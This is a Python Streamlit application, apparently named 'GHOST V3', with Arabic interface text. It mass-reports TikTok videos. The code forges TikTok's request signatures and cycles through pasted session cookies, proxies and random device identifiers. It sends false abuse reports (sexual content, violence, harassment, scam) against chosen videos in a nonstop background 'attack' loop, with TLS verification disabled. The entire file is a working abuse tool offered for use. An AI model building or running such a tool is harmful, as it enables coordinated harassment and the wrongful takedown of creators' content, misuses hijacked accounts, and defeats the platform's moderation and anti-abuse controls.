import streamlit as st
import os  

# محاولة تثبيت المكتبات إذا لم تكن موجودة (بدون حذف أي مكتبة أصلية)
try:  
    import requests  
    import binascii  
    import uuid  
    import time  
    import random  
    import secrets  
    import urllib3  
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
    from urllib.parse import urlencode
    import multiprocessing
    import re
    import datetime
    from MedoSigner import Argus, Gorgon, md5, Ladon  
except:  
    os.system("pip install requests uuid MedoSigner pycryptodome")  
      
import requests  
import binascii  
import uuid  
import time  
import random  
import os  
import secrets  
import urllib3  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
from urllib.parse import urlencode
import multiprocessing
import re
import datetime
from MedoSigner import Argus, Gorgon, md5, Ladon  
import threading

# --- إعدادات الواجهة المرعبة ---
st.set_page_config(page_title="GHOST V3 - FULL POWER", page_icon="💀", layout="wide")

st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #ff0000; }
    .stTextInput>div>div>input, .stTextArea>div>div>textarea {
        background-color: #0a0a0a; color: #ff0000; border: 1px solid #ff0000;
    }
    .stButton>button {
        background: linear-gradient(to bottom, #440000, #ff0000); color: black; font-weight: bold; 
        border: none; width: 100%; height: 50px; text-shadow: 1px 1px 2px white;
    }
    h1 { text-shadow: 5px 5px 20px red; text-align: center; font-family: 'Courier New'; font-size: 50px; }
    .status-panel { border: 2px solid #ff0000; padding: 20px; background: #050505; border-radius: 10px; }
    </style>
    """, unsafe_allow_html=True)

st.write("<h1>👹 GHOST SYSTEM UNLEASHED 👹</h1>", unsafe_allow_html=True)

# --- الحفاظ على كافة الدوال الأصلية بدون أي تعديل ---

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):  
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None  
    if not unix: unix = int(time.time())  
    return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}  

def get_video_info(link):
    try:
        response = requests.get(
            "https://api16-normal-c-alisg.ttapis.com/tiktok/linker/target/get/v1/",
            params={'url': link, 'iid': str(random.randint(1014, 1016)), 'device_id': str(random.randint(1014, 1016)), 'channel': 'googleplay', 'aid': '1233', 'app_name': 'musical_ly', 'version_code': '310503', 'version_name': '31.5.3', 'device_platform': 'android', 'device_type': 'SM-T505N', 'os_version': '12'},
            headers={'User-Agent': 'com.zhiliaoapp.musically/2023105030', 'x-argus': 'ahmed mahoz'}, timeout=5
        )
        Video = response.json()['landing_url']
        Username = Video.split("https://www.tiktok.com/@")[1].split("/video")[0]
        idVd = Video.split("/video/")[1].split("?")[0]
        tikinfo = requests.get(f'https://www.tiktok.com/@{Username}', timeout=5).text
        getting = tikinfo.split('webapp.user-detail"')[1].split('"RecommendUserList"')[0]
        UserId = getting.split('id":"')[1].split('",')[0]
        return idVd, UserId, Username
    except: return None, None, None

def report_video_fast(sessionid, idVd, UserId, report_type, proxy=None):
    try:
        secret = secrets.token_hex(16)
        cookies = {"sessionid": sessionid, "passport_csrf_token": secret, "passport_csrf_token_default": secret}
        params = {
            'report_type': "video", 'object_id': str(idVd), 'owner_id': str(UserId), 'reason': report_type['reason'], 'category': report_type['category'],
            'device_platform': "android", 'aid': "1233", 'app_name': "musical_ly", 'version_code': "370805", 'ts': str(int(time.time())),
            'iid': str(random.randint(1, 10**19)), 'device_id': str(random.randint(1, 10**19)), 'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
        }
        m = sign(params=urlencode(params), payload="", cookie=urlencode(cookies))
        headers = {'User-Agent': "com.zhiliaoapp.musically/2023708050", 'x-argus': m["x-argus"], 'x-gorgon': m["x-gorgon"], 'x-khronos': m["x-khronos"], 'x-ladon': m["x-ladon"]}
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(f"https://api16-normal-c-alisg.ttapis.com/aweme/v2/aweme/feedback/?{urlencode(params)}", headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=3)
        return '"status_code":0' in response.text
    except: return False

# --- إدارة حالة الإرسال المستمر ---
if 'attack_on' not in st.session_state: st.session_state.attack_on = False
if 'ok_count' not in st.session_state: st.session_state.ok_count = 0
if 'bad_count' not in st.session_state: st.session_state.bad_count = 0

# --- واجهة الإدخال ---
with st.sidebar:
    st.image("https://cdn-icons-png.flaticon.com/512/1163/1163742.png", width=100)
    st.header("👹 CONTROL PANEL")
    user_id_input = st.text_input("يوزر المستخدم (للتحقق)")
    report_type_sel = st.selectbox("نوع البلاغ", ["90087 (محتوى جنسي)", "90044 (عنف)", "90045 (تحرش)", "90053 (احتيال)"])
    
    REPORT_MAP = {
        "90087 (محتوى جنسي)": {"reason": "90087", "category": "porn"},
        "90044 (عنف)": {"reason": "90044", "category": "violence"},
        "90045 (تحرش)": {"reason": "90045", "category": "hate"},
        "90053 (احتيال)": {"reason": "90053", "category": "scam"}
    }

st.markdown("<div class='status-panel'>", unsafe_allow_html=True)
col_a, col_b, col_c = st.columns(3)
with col_a: sessions_area = st.text_area("🔑 لصق السيزنات", height=200, placeholder="ضع سيزن في كل سطر...")
with col_b: proxies_area = st.text_area("🌐 لصق البروكسيات", height=200, placeholder="IP:Port")
with col_c: links_area = st.text_area("🔗 لصق روابط الفيديوهات", height=200, placeholder="ضع رابط في كل سطر...")
st.markdown("</div>", unsafe_allow_html=True)

# دالة التشغيل المستمر (Worker Thread)
def attack_loop(sessions, links, report_data, proxies):
    while st.session_state.attack_on:
        for link in links:
            if not st.session_state.attack_on: break
            vid, uid, user = get_video_info(link)
            if vid:
                for sess in sessions:
                    if not st.session_state.attack_on: break
                    prx = random.choice(proxies) if proxies else None
                    if report_video_fast(sess, vid, uid, report_data, prx):
                        st.session_state.ok_count += 1
                    else:
                        st.session_state.bad_count += 1
                    time.sleep(0.01) # سرعة الهجوم المستمر

# الأزرار
btn_start, btn_stop = st.columns(2)
if btn_start.button("🔥 إطلاق الهجوم المستمر"):
    if sessions_area and links_area:
        st.session_state.attack_on = True
        
        s_list = [s.strip() for s in sessions_area.split('\n') if s.strip()]
        l_list = [l.strip() for l in links_area.split('\n') if l.strip()]
        p_list = [p.strip() for p in proxies_area.split('\n') if p.strip()]
        r_data = REPORT_MAP[report_type_sel]
        
        # بدء خيط الهجوم في الخلفية تماماً كبايثون
        threading.Thread(target=attack_loop, args=(s_list, l_list, r_data, p_list), daemon=True).start()
    else:
        st.error("❌ يجب وضع السيزنات والروابط أولاً!")

if btn_stop.button("🛑 إيقاف الهجوم"):
    st.session_state.attack_on = False

# عرض الإحصائيات المباشرة
st.markdown("---")
st.markdown(f"### 📊 حالة الهجوم: {'🟢 يعمل' if st.session_state.attack_on else '🔴 متوقف'}")
st.write(f"## ✅ بلاغات ناجحة: {st.session_state.ok_count} | ❌ بلاغات فاشلة: {st.session_state.bad_count}")

if st.session_state.attack_on:
    time.sleep(1) # تحديث الواجهة لرؤية العداد
    st.rerun()
